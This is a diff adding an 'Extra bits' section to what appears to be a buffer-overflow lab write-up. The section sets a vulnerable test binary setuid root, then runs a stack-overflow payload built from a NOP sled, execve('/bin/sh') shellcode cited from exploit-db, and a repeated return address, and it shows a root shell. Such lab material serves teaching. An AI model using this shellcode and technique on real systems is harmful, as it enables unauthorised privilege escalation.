@@ -250,6 +250,26 @@ $
 
 We got our exploit working.
 
+
+#### Extra bits ####
+
+Using the shellcode from https://www.exploit-db.com/exploits/13320
+
+And 
+
+```
+chmod +s vuln
+sudo chown root:root vuln
+```
+
+We can atain root:
+
+```
+./vuln $(python -c 'print "\x90" * (524-48-30+2) + "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"  + "\x7f\xff\xff\xff\xde\xad"[::-1] * 5  ')
+# whoami
+root
+```
+
 Thank you for getting to this point.
 
 References
